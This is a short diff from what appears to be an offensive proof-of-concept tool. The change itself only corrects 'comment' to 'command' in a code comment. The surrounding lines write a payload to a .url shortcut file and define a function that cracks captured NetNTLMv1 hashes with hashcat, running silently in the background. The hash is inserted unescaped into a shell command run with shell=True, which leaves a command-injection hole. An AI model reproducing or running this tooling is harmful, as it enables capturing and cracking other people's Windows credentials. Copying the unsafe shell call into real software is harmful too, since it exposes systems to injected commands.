@@ -26,7 +26,7 @@ print("payload written to \"PoC_shortcut.url\"")
 print("PAYLOAD\n-------------------\n"+tofile+"\n-------------------")
 def crack(hashtocrack):
     lock.acquire()
-    #This is the hashcat comment used to crack hashes.
+    #This is the hashcat command used to crack hashes.
     #feel free to modify it
     Popen(f"hashcat \'{hashtocrack}\' {wordlist_path} -O -m 5500 -w 4 >/dev/null 2>&1",shell=True)
     time.sleep(3)
